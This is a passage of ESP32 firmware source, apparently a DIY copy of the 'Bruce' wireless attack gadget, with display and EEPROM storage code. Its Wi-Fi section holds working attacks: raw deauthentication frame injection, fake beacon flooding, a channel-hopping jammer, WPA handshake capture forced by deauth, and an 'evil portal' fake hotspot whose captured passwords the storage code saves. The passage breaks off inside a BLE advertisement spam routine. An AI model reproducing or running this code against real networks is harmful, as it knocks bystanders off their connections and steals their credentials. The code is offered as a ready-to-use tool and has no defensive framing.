// ============================================================================
// ФУНКЦІЇ ДИСПЛЕЮ (250+ РЯДКІВ)
// ============================================================================

bool checkButton(int pin) {
    if (digitalRead(pin) == LOW && (millis() - lastDebounce) > debounceDelay) {
        lastDebounce = millis();
        return true;
    }
    return false;
}

void drawTopBar() {
    char buf[16];
    unsigned long seconds = millis() / 1000;
    int h = (seconds / 3600) % 24;
    int m = (seconds / 60) % 60;
    int s = seconds % 60;
    snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
    u8g2.setFont(u8g2_font_6x13_tr);
    u8g2.drawStr(2, 9, buf);
    u8g2.drawFrame(114, 1, 12, 6);
    u8g2.drawBox(126, 3, 2, 2);
    u8g2.drawBox(115, 2, 9, 4);
    u8g2.setCursor(55, 9);
    u8g2.print("67%");
    u8g2.setCursor(100, 9);
    u8g2.print(String(lastRSSI) + "dB");
    u8g2.drawLine(0, 10, 128, 10);
}

void showMessage(const char* msg, int delayMs) {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    int len = strlen(msg);
    if (len <= 21) {
        u8g2.drawStr((128 - u8g2.getStrWidth(msg)) / 2, 35, msg);
    } else {
        char line1[22], line2[22];
        strncpy(line1, msg, 21);
        line1[21] = '\\0';
        strncpy(line2, msg + 21, 21);
        line2[21] = '\\0';
        u8g2.drawStr((128 - u8g2.getStrWidth(line1)) / 2, 30, line1);
        u8g2.drawStr((128 - u8g2.getStrWidth(line2)) / 2, 45, line2);
    }
    u8g2.sendBuffer();
    delay(delayMs);
}

void drawMainMenu() {
    u8g2.clearBuffer();
    drawTopBar();
    const char* items[] = {"WiFi", "BLE", "NRF24", "RFID", "IR", "Settings"};
    const unsigned char* icons[] = {wifi_icon, ble_icon, nrf_icon, rfid_icon, ir_icon, settings_icon};
    u8g2.drawXBM(48, 16, 32, 32, icons[currentModule]);
    u8g2.setFont(u8g2_font_9x15B_tr);
    u8g2.drawStr(4, 36, "<");
    u8g2.drawStr(114, 36, ">");
    u8g2.setFont(u8g2_font_7x13B_tr);
    int w = u8g2.getStrWidth(items[currentModule]);
    u8g2.drawStr((128 - w) / 2, 58, items[currentModule]);
    u8g2.sendBuffer();
}

void drawSubMenu(const char* title, const char* items[], int size, int selected) {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    int titleW = u8g2.getStrWidth(title);
    u8g2.drawStr((128 - titleW) / 2, 10, title);
    for (int i = 0; i < size; i++) {
        int y = 24 + i * 10;
        if (i == selected) {
            u8g2.drawBox(0, y - 8, 128, 10);
            u8g2.setDrawColor(0);
            u8g2.drawStr(14, y, items[i]);
            u8g2.setDrawColor(1);
        } else {
            u8g2.drawStr(14, y, items[i]);
        }
    }
    u8g2.drawHLine(0, 55, 128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(2, 63, "UP/DN=sel OK=enter BACK=menu");
    u8g2.sendBuffer();
}

void bootAnimation() {
    for (int x = 128; x >= 0; x -= 8) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_logisoso24_tr);
        u8g2.drawStr(x + 4, 32, "DIY");
        u8g2.setFont(u8g2_font_7x13B_tr);
        u8g2.drawStr(x + 4, 48, "BRUCE");
        u8g2.sendBuffer();
        delay(10);
    }
    delay(500);
}

// ============================================================================
// ФУНКЦІЇ ЗБЕРІГАННЯ (220+ РЯДКІВ)
// ============================================================================

void storageSave() {
    EEPROM.begin(4096);
    String data = "===PASS===\\n" + capturedPasswords + "\\n===HAND===\\n" + handshakes + "\\n";
    for (int i = 0; i < data.length() && i < 4095; i++) {
        EEPROM.write(i, data[i]);
    }
    EEPROM.write(data.length(), 0);
    EEPROM.commit();
    EEPROM.end();
}

void storageLoad() {
    EEPROM.begin(4096);
    String loaded = "";
    for (int i = 0; i < 4096; i++) {
        char c = char(EEPROM.read(i));
        if (c == 0) break;
        loaded += c;
    }
    int passStart = loaded.indexOf("===PASS===\\n");
    int handStart = loaded.indexOf("===HAND===\\n");
    if (passStart != -1 && handStart != -1) {
        capturedPasswords = loaded.substring(passStart + 11, handStart - 1);
        handshakes = loaded.substring(handStart + 11);
    }
    EEPROM.end();
}

void storageAddPassword(const String& pwd) {
    capturedPasswords += "[PASS] " + pwd + "\\n";
    storageSave();
}

void storageAddHandshake(const String& hs) {
    handshakes += hs;
    storageSave();
}

void storageClear() {
    capturedPasswords = "";
    handshakes = "";
    storageSave();
    showMessage("Data cleared", 1000);
}

void storageFormat() {
    EEPROM.begin(4096);
    for (int i = 0; i < 4096; i++) EEPROM.write(i, 0);
    EEPROM.commit();
    EEPROM.end();
    capturedPasswords = "";
    handshakes = "";
    showMessage("Storage formatted", 1000);
}

// ============================================================================
// WIFI ФУНКЦІЇ (350+ РЯДКІВ)
// ============================================================================

void wifiScan() {
    showMessage("Scanning WiFi...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    wifiNetworkCount = WiFi.scanNetworks();
    if (wifiNetworkCount > 50) wifiNetworkCount = 50;
    for (int i = 0; i < wifiNetworkCount; i++) {
        wifiNetworkNames[i] = WiFi.SSID(i);
        if (wifiNetworkNames[i].length() == 0) wifiNetworkNames[i] = "<Hidden>";
        wifiNetworkChannel[i] = WiFi.channel(i);
        memcpy(wifiNetworkBSSID[i], WiFi.BSSID(i), 6);
    }
    char buf[64];
    sprintf(buf, "Found: %d networks", wifiNetworkCount);
    showMessage(buf, 1500);
    WiFi.mode(WIFI_AP_STA);
}

void wifiSendDeauth(uint8_t* bssid, uint8_t* client, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    deauthPackets++;
}

void wifiStartDeauth() {
    if (wifiNetworkCount == 0) { showMessage("SCAN first!", 1000); return; }
    int target = 0;
    while (true) {
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select target:");
        for (int i = 0; i < min(wifiNetworkCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, wifiNetworkNames[i].substring(0, 14).c_str());
        }
        u8g2.drawStr(5, 60, "UP/DN=select OK=start BACK"); u8g2.sendBuffer();
        if (checkButton(BTN_UP) && target > 0) target--;
        else if (checkButton(BTN_DOWN) && target < min(wifiNetworkCount, 5) - 1) target++;
        else if (checkButton(BTN_OK)) break;
        else if (checkButton(BTN_BACK)) return;
        delay(50);
    }
    deauthActive = true; deauthPackets = 0;
    int ch = wifiNetworkChannel[target];
    uint8_t* bssid = wifiNetworkBSSID[target];
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    showMessage("DEAUTH started on " + wifiNetworkNames[target], 1000);
    while (deauthActive) {
        wifiSendDeauth(bssid, broadcast, ch);
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "DEAUTH ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32]; sprintf(buf, "Packets: %lu", deauthPackets);
        u8g2.drawStr(5, 45, buf); u8g2.drawStr(5, 60, "BACK - Stop");
        u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) deauthActive = false;
        delay(50);
    }
    showMessage("DEAUTH stopped", 1000);
}

void wifiStopDeauth() { deauthActive = false; }

void wifiStartBeacon() {
    beaconActive = true; beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI", "Starbucks_WiFi", "Airport_Free", "Metro_Free", "PublicWiFi", "VPN_Secure"};
    showMessage("BEACON started", 1000);
    while (beaconActive) {
        for (int s = 0; s < 6 && beaconActive; s++) {
            uint8_t bssid[6]; for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            uint8_t packet[200]; int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00;
            packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            beaconPackets++;
        }
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "BEACON ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32]; sprintf(buf, "Sent: %lu", beaconPackets);
        u8g2.drawStr(5, 45, buf); u8g2.drawStr(5, 60, "BACK - Stop");
        u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) beaconActive = false;
        delay(30);
    }
}

void wifiStopBeacon() { beaconActive = false; }

void wifiStartJammer() {
    wifiJamActive = true;
    showMessage("WIFI JAMMER started", 1000);
    while (wifiJamActive) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            uint8_t packet[128];
            for (int i = 0; i < 20; i++) esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
            delay(1);
        }
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15, 30, "WIFI JAMMER");
        u8g2.drawStr(5, 60, "BACK - Stop");
        u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) wifiJamActive = false;
        delay(50);
    }
    showMessage("JAMMER stopped", 1000);
}

void wifiStopJammer() { wifiJamActive = false; }

void wifiHandshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeCapturing) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapolCount++;
            storageAddHandshake("[HANDSHAKE] " + currentTargetSSID + "\\n");
            showMessage("HANDSHAKE CAPTURED!", 2000);
            handshakeCapturing = false;
            return;
        }
    }
}

void wifiStartHandshake() {
    if (wifiNetworkCount == 0) { showMessage("SCAN first!", 1000); return; }
    int target = 0;
    while (true) {
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select network:");
        for (int i = 0; i < min(wifiNetworkCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, wifiNetworkNames[i].substring(0, 14).c_str());
        }
        u8g2.drawStr(5, 60, "OK - Capture BACK"); u8g2.sendBuffer();
        if (checkButton(BTN_UP) && target > 0) target--;
        else if (checkButton(BTN_DOWN) && target < min(wifiNetworkCount, 5) - 1) target++;
        else if (checkButton(BTN_OK)) break;
        else if (checkButton(BTN_BACK)) return;
        delay(50);
    }
    currentTargetSSID = wifiNetworkNames[target];
    memcpy(targetBSSID, wifiNetworkBSSID[target], 6);
    esp_wifi_set_channel(wifiNetworkChannel[target], WIFI_SECOND_CHAN_NONE);
    eapolCount = 0; handshakeCapturing = true;
    showMessage("Capturing handshake... 30s", 1500);
    unsigned long start = millis();
    while (handshakeCapturing && millis() - start < 30000) {
        wifiSendDeauth(targetBSSID, (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, wifiNetworkChannel[target]);
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32]; sprintf(buf, "EAPOL: %d", eapolCount); u8g2.drawStr(5, 30, buf);
        sprintf(buf, "Time: %d/30s", (millis() - start)/1000); u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Exit"); u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) handshakeCapturing = false;
        delay(100);
    }
    handshakeCapturing = false;
    if (eapolCount > 0) showMessage("HANDSHAKE saved!", 1500);
    else showMessage("Failed to capture", 1500);
}

void wifiSetChannel() {
    int ch = 1;
    while (true) {
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(40, 15, "WiFi Channel");
        u8g2.setFont(u8g2_font_logisoso24_tr);
        char buf[8]; sprintf(buf, "%d", ch);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128 - w)/2, 48, buf);
        u8g2.drawStr(5, 30, "<"); u8g2.drawStr(110, 30, ">");
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(2, 63, "LR=change OK=set BACK");
        u8g2.sendBuffer();
        if (checkButton(BTN_LEFT) && ch > 1) ch--;
        else if (checkButton(BTN_RIGHT) && ch < 14) ch++;
        else if (checkButton(BTN_OK)) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            showMessage(("Channel set to " + String(ch)).c_str(), 1000);
            break;
        } else if (checkButton(BTN_BACK)) break;
        delay(50);
    }
}

void wifiShowInfo() {
    u8g2.clearBuffer(); drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 20, "WiFi Info:");
    u8g2.drawStr(5, 35, ("MAC: " + WiFi.macAddress()).c_str());
    char buf[32]; sprintf(buf, "Channel: %d", WiFi.channel()); u8g2.drawStr(5, 50, buf);
    sprintf(buf, "RSSI: %d dBm", WiFi.RSSI()); u8g2.drawStr(5, 60, buf);
    u8g2.sendBuffer();
    while (!checkButton(BTN_BACK)) delay(50);
}

void wifiStartEvil() {
    if (evilActive) return;
    WiFi.softAP("FREE_WIFI", NULL);
    dnsServer.start(53, "*", WiFi.softAPIP());
    evilActive = true;
    showMessage("EVIL PORTAL: FREE_WIFI", 1500);
    while (evilActive) {
        dnsServer.processNextRequest();
        server.handleClient();
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "EVIL PORTAL");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 45, "SSID: FREE_WIFI");
        u8g2.drawStr(5, 60, "BACK - Stop");
        u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) evilActive = false;
        delay(100);
    }
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    showMessage("EVIL PORTAL stopped", 1000);
}

void wifiStopEvil() { evilActive = false; }

// ============================================================================
// BLE ФУНКЦІЇ (280+ РЯДКІВ)
// ============================================================================

void bleScan() {
    bleFound = 0;
    showMessage("Scanning BLE...", 500);
    BLEDevice::init("");
    BLEScan* pScan = BLEDevice::getScan();
    pScan->setActiveScan(true);
    BLEScanResults* results = pScan->start(5, false);
    bleFound = results->getCount();
    char buf[64]; sprintf(buf, "Found: %d BLE devices", bleFound);
    showMessage(buf, 1500);
    pScan->clearResults();
    BLEDevice::deinit();
}

void bleSendAdvert(const char* name, const uint8_t* data, int len) {
    BLEDevice::init("ESP_SPAM");
    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    advData.setFlags(0x06);
    if (name && strlen(name) > 0) advData.setName(name);
    if (data && len > 0) advData.setManufacturerData(data, len);
    pAdv->setAdvertisementData(advData);
    pAdv->start(); delay(50); pAdv->stop();
    BLEDevice::deinit();
}

void bleAppleJuice() {
    showMessage("APPLEJUICE SPAM", 1000);
    const uint8_t apple[] = {0x4C,0x00,0x0F,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    for (int i = 0; i < 50; i++) {
        bleSendAdvert(NULL, apple, sizeof(apple));
        if (checkButton(BTN_BACK)) break;
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32]; sprintf(buf, "AppleJuice: %d/50", i+1);
